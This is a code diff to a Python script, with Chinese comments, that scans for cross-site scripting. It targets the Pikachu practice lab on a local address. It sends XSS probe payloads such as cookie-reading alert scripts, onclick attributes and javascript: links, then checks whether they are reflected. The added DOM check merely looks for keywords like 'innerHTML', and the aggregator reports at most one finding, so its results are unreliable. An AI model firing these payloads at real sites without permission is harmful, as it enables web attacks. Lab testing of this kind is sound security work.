@@ -1,3 +1,4 @@
+import re
 import requests
 import urllib.parse
 from bs4 import BeautifulSoup
@@ -57,7 +58,7 @@ def checkResponseForString(response, data):
         print("字符串 '{}' 不存在于响应中".format(data))
         return False
 
-def check_xss_get_relected(url):
+def check_xss_get_reflected(url):
     data = '<script>alert(1)</script>'
     # 获取表单参数和值
     name, value_t = getParameter(url, data)
@@ -71,7 +72,7 @@ def check_xss_get_relected(url):
     # 构建payload并发送GET请求
     response = build_payloads_get(url, payload)
 
-    print(checkResponseForString(response, data))
+    return checkResponseForString(response, data)
 
 def check_xss_post_reflected(url):
     payload_login = {
@@ -97,9 +98,9 @@ def check_xss_post_reflected(url):
             # 提取需要的数据或进行其他操作
             return checkResponseForString(response, data)
         else:
-            return '访问受保护页面失败'
+            return False
     else:
-        return '登录失败'
+        return False
 
 def check_xss_stored(url):
     data = '<script>alert(document.cookie)</script>';
@@ -108,7 +109,23 @@ def check_xss_stored(url):
     # 构建payload并发送GET请求
     response = build_payloads_post(url, payload)
 
-    print(checkResponseForString(response, data))
+    return checkResponseForString(response, data)
+
+def check_xss_dom(url):
+    try:
+        # 发送GET请求获取页面响应
+        response = requests.get(url)
+        response_text = response.text
+
+        # 检查页面响应中是否包含关键词
+        if 'innerHTML' in response_text or 'innerText' in response_text or 'setAttribute' in response_text:
+            return True
+        else:
+            return False
+
+    except requests.RequestException as e:
+        print("请求错误:", e)
+        return False
 
 def check_xss_filterate(url):
     data = '<a herf="#" onclick="alert(document.cookie)">';
@@ -124,7 +141,7 @@ def check_xss_filterate(url):
     # 构建payload并发送GET请求
     response = build_payloads_get(url, payload)
 
-    print(checkResponseForString(response, data))
+    return checkResponseForString(response, data)
 
 def check_xss_htmlspecialchars(url):
     data = "#' onclick='alert(document.cookie)'"
@@ -140,9 +157,9 @@ def check_xss_htmlspecialchars(url):
     # 构建payload并发送GET请求
     response = build_payloads_get(url, payload)
 
-    print(checkResponseForString(response, data))
+    return checkResponseForString(response, data)
 
-def check_xss_herf(url):
+def check_xss_href(url):
     data = "javascript:alert(document.cookie)"
     # 获取表单参数和值
     name, value_t = getParameter(url, data)
@@ -156,7 +173,7 @@ def check_xss_herf(url):
     # 构建payload并发送GET请求
     response = build_payloads_get(url, payload)
 
-    print(checkResponseForString(response, data))
+    return checkResponseForString(response, data)
 
 def check_xss_js(url):
     data = "';alert(1);//"
@@ -172,13 +189,41 @@ def check_xss_js(url):
     # 构建payload并发送GET请求
     response = build_payloads_get(url, payload)
 
-    print(checkResponseForString(response, data))
+    return checkResponseForString(response, data)
+
+def check_xss_vulnerabilities(url):
+    vulnerabilities_found = []
+
+    if check_xss_get_reflected(url):
+        vulnerabilities_found = ['XSS GET Reflected']
+    else:
+        if check_xss_post_reflected(url):
+            vulnerabilities_found.append('XSS POST Reflected')
+        if check_xss_stored(url):
+            vulnerabilities_found.append('XSS Stored')
+        if check_xss_dom(url):
+            vulnerabilities_found.append('XSS DOM')
+        if check_xss_filterate(url):
+            vulnerabilities_found.append('XSS Filterate')
+        if check_xss_htmlspecialchars(url):
+            vulnerabilities_found.append('XSS htmlspecialchars')
+        if check_xss_href(url):
+            vulnerabilities_found.append('XSS Href')
+        if check_xss_js(url):
+            vulnerabilities_found.append('XSS JavaScript')
+
+    return vulnerabilities_found[:1]  # 只返回最新检测出的漏洞，最多一个
+
+
+
 # 示例用法
 if __name__ == '__main__':
-    check_xss_get_relected('http://192.168.1.192:8086/pikachu/vul/xss/xss_reflected_get.php')
-    check_xss_post_reflected('http://192.168.1.192:8086/pikachu/vul/xss/xsspost/post_login.php')
-    check_xss_stored('http://192.168.1.192:8086/pikachu/vul/xss/xss_stored.php')
-    check_xss_filterate('http://192.168.1.192:8086/pikachu/vul/xss/xss_01.php')
-    check_xss_htmlspecialchars('http://192.168.1.192:8086/pikachu/vul/xss/xss_02.php')
-    check_xss_herf('http://192.168.1.192:8086/pikachu/vul/xss/xss_03.php')
-    check_xss_js('http://192.168.1.192:8086/pikachu/vul/xss/xss_04.php')
+    # check_xss_get_reflected('http://192.168.1.192:8086/pikachu/vul/xss/xss_reflected_get.php')
+    # check_xss_post_reflected('http://192.168.1.192:8086/pikachu/vul/xss/xsspost/post_login.php')
+    # check_xss_stored('http://192.168.1.192:8086/pikachu/vul/xss/xss_stored.php')
+    # check_xss_filterate('http://192.168.1.192:8086/pikachu/vul/xss/xss_01.php')
+    # check_xss_htmlspecialchars('http://192.168.1.192:8086/pikachu/vul/xss/xss_02.php')
+    # check_xss_href('http://192.168.1.192:8086/pikachu/vul/xss/xss_03.php')
+    # check_xss_js('http://192.168.1.192:8086/pikachu/vul/xss/xss_04.php')
+    # check_xss_dom('http://192.168.1.192:8086/pikachu/vul/xss/xss_dom.php')
+    print(check_xss_vulnerabilities('http://192.168.1.192:8086/pikachu/vul/xss/xss_reflected_get.php'))
